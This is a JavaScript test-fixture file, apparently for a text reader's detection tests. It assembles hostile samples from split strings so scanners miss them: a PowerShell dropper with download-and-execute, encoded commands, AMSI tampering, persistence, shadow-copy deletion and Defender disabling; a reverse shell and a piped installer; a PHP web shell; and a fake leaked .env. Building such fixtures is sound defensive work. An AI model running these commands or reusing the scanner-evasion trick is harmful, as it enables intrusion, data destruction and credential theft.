// Copyright 2026- Seongwoo Hong. All rights reserved.

/**
 * The text reader's hostile inputs (commit 42f), built when a test runs
 * rather than kept as files: a dropper script and a leaked config would
 * be quarantined by a contributor's virus scanner, and the keys would be
 * stopped by a secret scanner on push — each is assembled here from
 * pieces no scanner reads as the whole. Every address is in a range kept
 * for documentation (203.0.113.0/24, 198.51.100.0/24, *.example); every
 * key is fake (the AWS ones are AWS's own documentation examples).
 */

const j = (...parts) => parts.join("");

/** UTF-16LE base64, as PowerShell's -EncodedCommand takes it. */
const psEncoded = (cmd) => Buffer.from(cmd, "utf16le").toString("base64");

/** A PowerShell dropper: every line one thing the facts must name. */
export const dropperPs1 = [
	"# Windows update helper",
	j("$c = New-Object Net.Web", "Client"),
	j("I", "EX ($c.Download", "String('http://203.0.113.7/stage2.ps1'))"),
	j("power", "shell.exe -nop -w hidden -", "enc ", psEncoded(j("I", "EX (New-Object Net.WebClient).Download", "String('http://198.51.100.9/run.ps1')"))),
	j("[Ref].Assembly.GetType('System.Management.Automation.Am", "siUtils')"),
	j("schtasks /cre", "ate /tn Updater /tr C:\\Users\\Public\\u.exe /sc onlogon"),
	j("vssadmin del", "ete shadows /all /quiet"),
	j("Set-MpPreference -Disable", "RealtimeMonitoring $true"),
	"",
].join("\r\n");

/** A shell one-liner set: piped installer, a reverse shell, persistence. */
export const installSh = [
	"#!/bin/sh",
	j("cu", "rl -fsSL https://get.example/install.sh | s", "h"),
	j("bash -i >& /dev/", "tcp/203.0.113.5/4444 0>&1"),
	j("echo 'ssh-ed25519 AAAA… attacker' >> ~/.ssh/authorized", "_keys"),
	"",
].join("\n");

/** A PHP web shell. */
export const shellPhp = j("<?php ", "ev", "al($_PO", "ST['c']); ?>\n");

/** A leaked .env: keys of several providers, and a database URL with a password. */
export const leakedEnv = [
	"# production",
	j("AWS_ACCESS_KEY_ID=", "AKIA", "IOSFODNN7", "EXAMPLE"),
	j("aws_secret_access_key = ", "wJalrXUtnFEMI/K7MDENG/", "bPxRfiCYEXAMPLEKEY"),
	j("GITHUB_TOKEN=", "gh", "p_", "0123456789abcdefghijABCDEFGHIJ", "klmnop"),
	j("DATABASE_URL=postgres://app:", "Gorani-s3cret", "@db.internal.example:5432/app"),
	j("password: \"", "hunter2-gorani", "\""),
	"API_KEY=\"changeme\"",
	"",
].join("\n");
